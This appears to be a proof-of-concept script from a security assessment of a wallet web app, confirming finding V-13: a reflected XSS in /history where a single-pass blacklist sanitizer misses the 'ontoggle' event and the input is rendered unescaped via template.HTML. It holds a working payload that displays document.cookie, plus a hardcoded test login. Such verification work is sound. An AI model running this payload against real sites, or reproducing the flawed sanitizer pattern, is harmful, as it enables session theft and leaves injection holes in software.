# -*- coding: utf-8 -*-
"""V-13. Отражённая XSS в истории операций.

handlers_money.go: q прогоняется через sanitizeSearchDisplay (однопроходный
блэклист) и кладётся в QRaw = template.HTML(...), то есть без экранирования
(history.html: <span>{{.QRaw}}</span>). Блэклист удаляет подстроку один раз,
поэтому вложенная запись onerror его переживает.
"""
from wallet_client import Client, parser, banner, ok, fail
import urllib.parse


def main():
    a = parser("Отражённая XSS в /history").parse_args()
    c = Client(a.base)
    c.login("ivanov", "workplace1")

    # Блэклист режет script/onerror/onload/onmouseover/javascript:, но не ontoggle.
    # <details open ontoggle=...> срабатывает автоматически при отрисовке.
    payload = '<details open ontoggle=alert(document.cookie)>pwn</details>'
    q = urllib.parse.quote(payload)
    body = c.get(f"/history?q={q}")[2].decode("utf-8", "replace")

    if payload not in body:
        fail("полезная нагрузка не прошла санитайзер / экранирована")
    banner("в ответ попал неэкранированный: " + payload)
    ok("рефлективная XSS подтверждена (событие ontoggle не в блэклисте)")


if __name__ == "__main__":
    main()
